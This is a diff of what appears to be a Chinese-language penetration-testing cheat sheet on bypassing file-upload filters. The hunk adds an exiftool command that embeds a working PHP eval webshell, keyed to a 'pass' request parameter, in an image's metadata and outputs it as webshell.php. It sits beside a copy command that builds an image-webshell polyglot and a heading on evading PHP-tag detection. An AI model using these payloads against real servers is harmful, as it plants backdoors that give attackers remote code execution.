@@ -260,6 +260,12 @@ root:x:0:0:root:/root:/bin/ash
 ```cmd
 copy real.jpg /b + shell.php /a shell.jpg
 ```
+- **exiftool**
+
+```bash
+exiftool -Comment='<?php @eval($_REQUEST["pass"]);echo "_changed";?>' shell.jpg -o webshell.php
+```
+
 <span style="font-size: 23px;">**PHP的代码标记**</span> 
 
 有些网站通过检测文件内容中是否出现了PHP代码标记从而判断是否是WebShell
